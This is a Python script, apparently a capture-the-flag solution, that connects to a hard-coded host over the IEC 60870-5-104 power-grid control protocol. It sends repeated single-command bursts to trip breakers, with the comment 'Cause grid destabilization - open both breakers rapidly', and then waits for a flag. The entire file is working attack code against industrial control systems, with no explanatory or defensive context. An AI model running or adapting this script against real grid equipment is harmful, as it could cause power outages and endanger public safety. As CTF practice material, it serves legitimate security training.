#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

def main():
    s = socket.socket()
    s.settimeout(300)
    try:
        s.connect((HOST, PORT))
        s.send(bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00]))
        time.sleep(2)
        r = s.recv(1024)
        print(r.hex() if r else 'none')
        ca = bytes([0x01, 0x00])
        tx = [0]
        rx = [0]
        def send_i(asdu):
            apci = bytes([0x68, len(asdu)+4, tx[0]&0xFF,(tx[0]>>8)&0xFF, rx[0]&0xFF,(rx[0]>>8)&0xFF])
            tx[0] += 2; rx[0] += 2
            s.send(apci+asdu)
        # Cause grid destabilization - open both breakers rapidly
        for _ in range(5):
            for ioa_num in [1, 2]:
                ioa = bytes([ioa_num&0xFF,(ioa_num>>8)&0xFF,(ioa_num>>16)&0xFF])
                # Try to trip/open - different SCO combinations
                for sco in [0x81, 0x01, 0x80, 0x00]:
                    asdu = bytes([45, 0x01, 0x06, 0x00]) + ca + ioa + bytes([sco])
                    send_i(asdu)
            time.sleep(0.05)
        print('sent bursts')
        start = time.time()
        while time.time() - start < 300:
            try:
                s.settimeout(30)
                r = s.recv(32768)
                if not r: 
                    print('closed'); break
                print('===DATA===', r.hex())
                if b'CTF{' in r:
                    print('[FLAG]', r)
                    break
                # also print as string if possible
                try:
                    s2 = r
                    if b'CTF' in s2:
                        print(s2)
                except:
                    pass
            except socket.timeout:
                try: s.send(bytes([0x68,0x04,0x43,0x00,0x00,0x00]))
                except: break
                continue
            except Exception as e:
                print(e); break
    finally:
        try: s.close()
        except: pass

if __name__ == '__main__':
    main()
